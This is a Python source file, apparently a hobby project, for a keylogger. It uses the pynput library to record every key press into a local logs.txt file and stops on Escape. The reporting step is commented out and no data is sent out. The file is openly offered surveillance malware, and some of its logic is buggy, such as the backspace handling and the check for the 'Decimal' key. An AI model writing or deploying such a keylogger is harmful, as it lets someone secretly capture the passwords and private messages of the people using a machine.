import pynput
from threading import Semaphore, Timer
from pynput.keyboard import Key , Listener
import sys
class keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # for blocking after setting the on_release listener
        # self.semaphore = Semaphore(0)
    def start(self):
        # start the keylogger
        with Listener(on_press=self.on_press) as listener:
            listener.join()
        # start reporting the keylogs
        # self.report()
        # block the current thread,
        # since on_release() doesn't block the current thread
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        # self.semaphore.acquire()
    def backspace (self,s):
        q = []  
  
        for i in range(0, len(s)):  
  
            if s[i] != '#':  
                q.append(s[i])  
            elif len(q) != 0:  
                q.pop()  
    
        # Build final string  
        ans = ""  
  
        while len(q) != 0:  
            ans += q[0]  
            q.pop(0)  
  
    # return final string  
        return ans 
    def on_press(self,key):
        name = str(key)
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if key == Key.space:
                # " " instead of "space"
                # name = " "
                self.write(" ")
            elif key == Key.enter:
                # add a new line whenever an ENTER is pressed
                # name = "\n"
                self.write("\n")
            elif key == "Decimal":
                name = "."
            elif key == Key.backspace:
                self.write("#")
                with open("logs.txt","r") as f1:
                    line = f1.readlines()
                    lines = self.backspace(line)
                with open("logs.txt","w") as f2:
                    f2.writelines(lines+"\n")

            elif key == Key.esc:
                sys.exit()  
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                # name = f"{name}"
                self.write(name[1])
        # print(name,"log is written")
    def write(self,name):
        with open("logs.txt","a") as f:
            f.write(name)

if __name__ == "__main__":
    keylogger = keylogger(600)
    keylogger.start()
